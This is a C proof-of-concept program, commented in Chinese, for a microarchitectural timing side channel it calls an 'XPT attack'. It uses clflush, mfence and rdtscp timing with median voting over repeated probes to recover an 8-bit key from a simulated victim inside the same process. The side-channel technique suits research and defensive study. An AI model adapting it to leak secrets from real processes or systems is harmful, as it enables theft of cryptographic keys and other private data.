#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <x86intrin.h>

#define PAGE_SIZE 4096
#define XPT_SIZE 256
#define THRESHOLD 32
#define KEY_BITS 8

// --- 核心改进：每位重复测量 5 次 ---
#define REPEAT_COUNT 5

// 保持之前的安全填充策略
#define SAFETY_MARGIN 0
#define TRAIN_COUNT (XPT_SIZE - SAFETY_MARGIN)
#define VICTIM_PAGES 1

static inline void clflush(volatile void *p) { asm volatile("clflush (%0)" :: "r"(p)); }
static inline void mfence() { asm volatile("mfence" ::: "memory"); }
static inline uint64_t rdtscp() { unsigned int junk; return __rdtscp(&junk); }

void busy_wait(int cycles) {
    for (volatile int i = 0; i < cycles; i++);
}

void train_page(volatile char *addr) {
    for (int i = 0; i < THRESHOLD + 5; i++) {
        volatile char junk = *addr; mfence();
        clflush(addr); mfence();
    }
}

// 比较函数用于排序 (找中位数)
int compare_uint32(const void *a, const void *b) {
    return (*(uint32_t*)a - *(uint32_t*)b);
}

// 单次探测逻辑
uint32_t probe_once(int bit, uint8_t secret_key, 
                    volatile char **attacker_pages, 
                    volatile char *victim_base,
                    int dry_run) 
{
    // 1. Setup
    train_page(attacker_pages[0]);
    for (int i = 1; i < TRAIN_COUNT; i++) train_page(attacker_pages[i]);

    // 2. Victim
    int current_bit_val = (secret_key >> bit) & 1;
    if (dry_run) current_bit_val = 0; 

    if (current_bit_val) {
        for (int v = 0; v < VICTIM_PAGES; v++) {
            volatile char *vp = victim_base + (v * PAGE_SIZE);
            clflush(vp); mfence();
            volatile char junk = *vp; mfence();
        }
    }

    // 3. Probe
    busy_wait(100); 
    clflush(attacker_pages[0]); mfence();
    
    uint64_t start = rdtscp();
    volatile char junk = *attacker_pages[0]; mfence();
    uint32_t lat = (uint32_t)(rdtscp() - start);
    
    return lat;
}

int main() {
    size_t mem_size = 1000 * PAGE_SIZE;
    char *buffer = (char *)aligned_alloc(PAGE_SIZE, mem_size);
    memset(buffer, 0x55, mem_size);

    volatile char *attacker_pages[XPT_SIZE];
    for (int i = 0; i < XPT_SIZE; i++) attacker_pages[i] = &buffer[i * PAGE_SIZE];
    volatile char *victim_base = &buffer[500 * PAGE_SIZE];
    
    uint8_t secret_key = 0x96;
    uint8_t recovered_key = 0;

    printf("=== XPT ATTACK (STATISTICAL VOTING) ===\n");
    printf("Target Key: 0x%02x\n", secret_key);

    // 1. 校准
    printf("[*] Calibrating...\n");
    uint32_t fast_samples[5];
    for(int i=0; i<5; i++) {
        fast_samples[i] = probe_once(0, 0, attacker_pages, victim_base, 1); // Dry run (Fast)
    }
    // 取中位数作为基准
    qsort(fast_samples, 5, sizeof(uint32_t), compare_uint32);
    uint32_t fast_median = fast_samples[2];
    
    // tag_latency=80。
    // 阈值设为 Fast + 40
    uint32_t threshold = fast_median + 40;
    printf("[*] Median Fast: %u | Threshold: %u\n\n", fast_median, threshold);

    // 2. 攻击循环
    for (int bit = 0; bit < KEY_BITS; bit++) {
        uint32_t latencies[REPEAT_COUNT];
        
        // --- 核心：每位测 5 次 ---
        for (int r = 0; r < REPEAT_COUNT; r++) {
            latencies[r] = probe_once(bit, secret_key, attacker_pages, victim_base, 0);
        }
        
        // 排序找中位数
        qsort(latencies, REPEAT_COUNT, sizeof(uint32_t), compare_uint32);
        uint32_t median_lat = latencies[REPEAT_COUNT / 2];
        
        int guess = (median_lat > threshold) ? 1 : 0;
        if (guess) recovered_key |= (1 << bit);

        printf("Bit %d | Raw: [%3u, %3u, %3u, %3u, %3u] -> Median: %3u | Guess: %d | %s\n", 
               bit, 
               latencies[0], latencies[1], latencies[2], latencies[3], latencies[4], 
               median_lat, 
               guess, (guess == ((secret_key >> bit) & 1) ? "OK" : "FAIL"));
    }

    printf("\nRecovered: 0x%02x (Target: 0x%02x)\n", recovered_key, secret_key);
    return (recovered_key == secret_key) ? 0 : 1;
}